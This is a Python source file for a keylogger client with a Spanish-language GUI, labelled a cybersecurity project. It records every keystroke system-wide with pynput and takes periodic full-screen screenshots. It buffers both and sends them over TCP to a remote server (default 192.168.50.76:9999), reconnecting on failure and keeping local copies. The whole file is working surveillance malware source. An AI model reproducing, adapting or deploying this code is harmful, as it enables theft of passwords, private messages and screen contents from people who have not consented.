#!/usr/bin/env python3
"""
=============================================================
  CLIENTE KEYLOGGER CON GUI - Proyecto de Ciberseguridad
=============================================================
"""

import socket
import json
import io
import os
import sys
import time
import threading
import tkinter as tk
from tkinter import scrolledtext, messagebox
from datetime import datetime

try:
    from pynput import keyboard
except ImportError:
    print("[!] Instala pynput: pip install pynput")
    sys.exit(1)

try:
    from PIL import ImageGrab
except ImportError:
    print("[!] Instala Pillow: pip install Pillow")
    sys.exit(1)

# ── Configuración por defecto ──────────────────────────────
DEFAULT_HOST = "192.168.50.76"
DEFAULT_PORT = 9999
SCREENSHOT_INTERVAL = 60
KEY_BUFFER_FLUSH_INTERVAL = 5
LOCAL_LOG_FILE = "local_log.txt"


class ClientGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("👁 Cliente Keylogger - Ciberseguridad")
        self.root.geometry("750x580")
        self.root.configure(bg="#1a1a2e")
        self.root.resizable(True, True)

        self.sock = None
        self.connected = False
        self.running = False
        self.listener = None

        self.key_buffer = []
        self.buffer_lock = threading.Lock()

        self.keys_sent = 0
        self.screenshots_sent = 0

        self.build_gui()

    # ── GUI ────────────────────────────────────────────────

    def build_gui(self):
        bg = "#1a1a2e"
        fg = "#e0e0e0"
        accent = "#e94560"
        entry_bg = "#16213e"

        # Header
        header = tk.Frame(self.root, bg=accent, pady=10)
        header.pack(fill=tk.X)

        tk.Label(
            header, text="👁 CLIENTE KEYLOGGER",
            font=("Helvetica", 18, "bold"), bg=accent, fg="white"
        ).pack()

        # ── Configuración de conexión ──────────────────────
        config_frame = tk.LabelFrame(
            self.root, text=" 🔗 Conexión al Servidor ",
            font=("Helvetica", 11, "bold"),
            bg=bg, fg=fg, padx=10, pady=8
        )
        config_frame.pack(fill=tk.X, padx=10, pady=(10, 5))

        row1 = tk.Frame(config_frame, bg=bg)
        row1.pack(fill=tk.X, pady=2)

        tk.Label(row1, text="IP Servidor:", bg=bg, fg=fg,
                 font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.host_entry = tk.Entry(row1, width=18, bg=entry_bg, fg="#00d2ff",
                                   insertbackground=fg, font=("Courier", 11, "bold"))
        self.host_entry.insert(0, DEFAULT_HOST)
        self.host_entry.pack(side=tk.LEFT, padx=(5, 20))

        tk.Label(row1, text="Puerto:", bg=bg, fg=fg,
                 font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.port_entry = tk.Entry(row1, width=8, bg=entry_bg, fg=fg,
                                   insertbackground=fg, font=("Courier", 10))
        self.port_entry.insert(0, str(DEFAULT_PORT))
        self.port_entry.pack(side=tk.LEFT, padx=5)

        # Fila 2: Intervalo de screenshots
        row2 = tk.Frame(config_frame, bg=bg)
        row2.pack(fill=tk.X, pady=2)

        tk.Label(row2, text="Screenshots cada:", bg=bg, fg=fg,
                 font=("Helvetica", 10)).pack(side=tk.LEFT)
        self.interval_entry = tk.Entry(row2, width=5, bg=entry_bg, fg=fg,
                                       insertbackground=fg, font=("Courier", 10))
        self.interval_entry.insert(0, str(SCREENSHOT_INTERVAL))
        self.interval_entry.pack(side=tk.LEFT, padx=5)
        tk.Label(row2, text="segundos", bg=bg, fg="#aaa",
                 font=("Helvetica", 10)).pack(side=tk.LEFT)

        # ── Botones ────────────────────────────────────────
        btn_frame = tk.Frame(self.root, bg=bg)
        btn_frame.pack(fill=tk.X, padx=10, pady=5)

        self.start_btn = tk.Button(
            btn_frame, text="▶ CONECTAR E INICIAR",
            font=("Helvetica", 12, "bold"),
            bg="#28a745", fg="white", activebackground="#218838",
            cursor="hand2", padx=20, pady=5,
            command=self.start_client
        )
        self.start_btn.pack(side=tk.LEFT, padx=(0, 10))

        self.stop_btn = tk.Button(
            btn_frame, text="⏹ DETENER",
            font=("Helvetica", 12, "bold"),
            bg=accent, fg="white", activebackground="#c82333",
            cursor="hand2", padx=20, pady=5,
            state=tk.DISABLED,
            command=self.stop_client
        )
        self.stop_btn.pack(side=tk.LEFT)

        # Status
        self.status_label = tk.Label(
            btn_frame, text="● Desconectado",
            font=("Helvetica", 11), bg=bg, fg="#ff6b6b"
        )
        self.status_label.pack(side=tk.RIGHT, padx=10)

        # ── Estadísticas ───────────────────────────────────
        stats_frame = tk.Frame(self.root, bg=bg)
        stats_frame.pack(fill=tk.X, padx=10, pady=2)

        self.stats_label = tk.Label(
            stats_frame,
            text="⌨ Envíos de teclas: 0   |   📷 Screenshots: 0",
            font=("Helvetica", 10), bg=bg, fg="#aaa"
        )
        self.stats_label.pack(side=tk.LEFT)

        # ── Log ────────────────────────────────────────────
        log_label = tk.Label(
            self.root, text="📋 Actividad:",
            font=("Helvetica", 11, "bold"), bg=bg, fg=fg, anchor="w"
        )
        log_label.pack(fill=tk.X, padx=10, pady=(10, 2))

        self.log_text = scrolledtext.ScrolledText(
            self.root, width=80, height=16,
            bg="#0d1117", fg="#58a6ff",
            insertbackground=fg, font=("Courier", 10),
            state=tk.DISABLED, wrap=tk.WORD
        )
        self.log_text.pack(fill=tk.BOTH, expand=True, padx=10, pady=(0, 10))

        self.log_text.tag_config("info", foreground="#58a6ff")
        self.log_text.tag_config("success", foreground="#3fb950")
        self.log_text.tag_config("warning", foreground="#d29922")
        self.log_text.tag_config("error", foreground="#f85149")
        self.log_text.tag_config("key", foreground="#bc8cff")
        self.log_text.tag_config("screenshot", foreground="#79c0ff")

    # ── Logging ────────────────────────────────────────────

    def log(self, message, tag="info"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.root.after(0, self._append_log, f"[{ts}] {message}\n", tag)

    def _append_log(self, text, tag):
        self.log_text.config(state=tk.NORMAL)
        self.log_text.insert(tk.END, text, tag)
        self.log_text.see(tk.END)
        self.log_text.config(state=tk.DISABLED)

    def update_stats(self):
        self.root.after(0, self.stats_label.config, {
            "text": f"⌨ Envíos de teclas: {self.keys_sent}   |   📷 Screenshots: {self.screenshots_sent}"
        })

    # ── Conexión ───────────────────────────────────────────

    def connect(self):
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            host = self.host_entry.get().strip()
            port = int(self.port_entry.get().strip())
            self.sock.connect((host, port))
            self.connected = True
            self.log(f"✅ Conectado a {host}:{port}", "success")
            self.root.after(0, self.status_label.config,
                            {"text": "● Conectado", "fg": "#3fb950"})
            return True
        except Exception as e:
            self.log(f"Error de conexión: {e}", "error")
            self.connected = False
            return False

    def reconnect(self):
        delay = 5
        while self.running and not self.connected:
            self.log(f"Reintentando en {delay}s...", "warning")
            time.sleep(delay)
            if self.connect():
                return True
            delay = min(delay * 2, 60)
        return False

    def send_data(self, msg_type, payload, filename=None):
        if not self.connected:
            return False
        try:
            header = {"type": msg_type, "size": len(payload)}
            if filename:
                header["filename"] = filename
            header_json = json.dumps(header).encode("utf-8") + b"\n"
            self.sock.sendall(header_json + payload)
            return True
        except (BrokenPipeError, ConnectionResetError, OSError) as e:
            self.log(f"Error de envío: {e}", "error")
            self.connected = False
            self.root.after(0, self.status_label.config,
                            {"text": "● Reconectando...", "fg": "#d29922"})
            return False

    # ── Captura de teclas ──────────────────────────────────

    def on_key_press(self, key):
        try:
            special_keys = {
                keyboard.Key.space: " ",
                keyboard.Key.enter: "[ENTER]\n",
                keyboard.Key.tab: "[TAB]",
                keyboard.Key.backspace: "[BACKSPACE]",
                keyboard.Key.delete: "[DELETE]",
                keyboard.Key.shift: "",
                keyboard.Key.shift_r: "",
                keyboard.Key.ctrl_l: "[CTRL]",
                keyboard.Key.ctrl_r: "[CTRL_R]",
                keyboard.Key.alt_l: "[ALT]",
                keyboard.Key.alt_r: "[ALT_R]",
                keyboard.Key.caps_lock: "[CAPS]",
                keyboard.Key.esc: "[ESC]",
            }

            if key in special_keys:
                char = special_keys[key]
            elif hasattr(key, "char") and key.char is not None:
                char = key.char
            else:
                char = f"[{key}]"

            if char:
                with self.buffer_lock:
                    self.key_buffer.append(char)
        except Exception:
            pass

    def flush_key_buffer(self):
        while self.running:
            time.sleep(KEY_BUFFER_FLUSH_INTERVAL)

            with self.buffer_lock:
                if not self.key_buffer:
                    continue
                keys_text = "".join(self.key_buffer)
                self.key_buffer.clear()

            # Log local
            self.write_local_log(keys_text)

            # Enviar
            if self.connected:
                payload = keys_text.encode("utf-8")
                if self.send_data("keys", payload):
                    self.keys_sent += 1
                    self.update_stats()
                    display = keys_text.replace("\n", "↵")
                    if len(display) > 50:
                        display = display[:50] + "..."
                    self.log(f"⌨ Teclas enviadas: {display}", "key")
                else:
                    threading.Thread(target=self.reconnect, daemon=True).start()

    def write_local_log(self, text):
        try:
            with open(LOCAL_LOG_FILE, "a", encoding="utf-8") as f:
                ts = datetime.now().strftime("%H:%M:%S")
                f.write(f"[{ts}] {text}\n")
        except Exception:
            pass

    # ── Screenshots ────────────────────────────────────────

    def screenshot_loop(self):
        try:
            interval = int(self.interval_entry.get().strip())
        except ValueError:
            interval = SCREENSHOT_INTERVAL

        while self.running:
            time.sleep(interval)
            if not self.running:
                break

            try:
                screenshot = ImageGrab.grab()
                buffer = io.BytesIO()
                screenshot.save(buffer, format="PNG")
                img_data = buffer.getvalue()
            except Exception as e:
                self.log(f"Error capturando pantalla: {e}", "error")
                continue

            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"screenshot_{timestamp}.png"
            size_kb = len(img_data) / 1024

            if self.connected:
                if self.send_data("screenshot", img_data, filename):
                    self.screenshots_sent += 1
                    self.update_stats()
                    self.log(f"📷 Screenshot enviado: {filename} ({size_kb:.1f} KB)", "screenshot")
                else:
                    self.save_screenshot_local(img_data, filename)
                    threading.Thread(target=self.reconnect, daemon=True).start()
            else:
                self.save_screenshot_local(img_data, filename)

    def save_screenshot_local(self, img_data, filename):
        local_dir = "local_screenshots"
        os.makedirs(local_dir, exist_ok=True)
        path = os.path.join(local_dir, filename)
        try:
            with open(path, "wb") as f:
                f.write(img_data)
            self.log(f"💾 Guardado local: {filename}", "warning")
        except Exception as e:
            self.log(f"Error guardando local: {e}", "error")

    # ── Control ────────────────────────────────────────────

    def start_client(self):
        self.running = True
        self.keys_sent = 0
        self.screenshots_sent = 0

        self.start_btn.config(state=tk.DISABLED)
        self.stop_btn.config(state=tk.NORMAL)
        self.host_entry.config(state=tk.DISABLED)
        self.port_entry.config(state=tk.DISABLED)
        self.interval_entry.config(state=tk.DISABLED)

        self.log("Iniciando cliente...", "info")

        threading.Thread(target=self._start_worker, daemon=True).start()

    def _start_worker(self):
        # Conectar
        if not self.connect():
            self.log("Modo offline, reintentando...", "warning")
            threading.Thread(target=self.reconnect, daemon=True).start()

        # Hilo flush de teclas
        threading.Thread(target=self.flush_key_buffer, daemon=True).start()

        # Hilo screenshots
        threading.Thread(target=self.screenshot_loop, daemon=True).start()

        # Listener de teclado
        self.log("Capturando teclas...", "success")
        self.listener = keyboard.Listener(on_press=self.on_key_press)
        self.listener.start()

    def stop_client(self):
        self.running = False
        self.log("Deteniendo cliente...", "warning")

        if self.listener:
            self.listener.stop()

        # Flush remaining
        with self.buffer_lock:
            if self.key_buffer:
                remaining = "".join(self.key_buffer)
                self.write_local_log(remaining)
                self.key_buffer.clear()

        if self.sock:
            try:
                self.sock.close()
            except Exception:
                pass
        self.connected = False

        self.start_btn.config(state=tk.NORMAL)
        self.stop_btn.config(state=tk.DISABLED)
        self.host_entry.config(state=tk.NORMAL)
        self.port_entry.config(state=tk.NORMAL)
        self.interval_entry.config(state=tk.NORMAL)
        self.status_label.config(text="● Desconectado", fg="#ff6b6b")

        self.log("Cliente detenido.", "warning")


def main():
    root = tk.Tk()
    app = ClientGUI(root)
    root.protocol("WM_DELETE_WINDOW", lambda: (app.stop_client(), root.destroy()))
    root.mainloop()


if __name__ == "__main__":
    main()
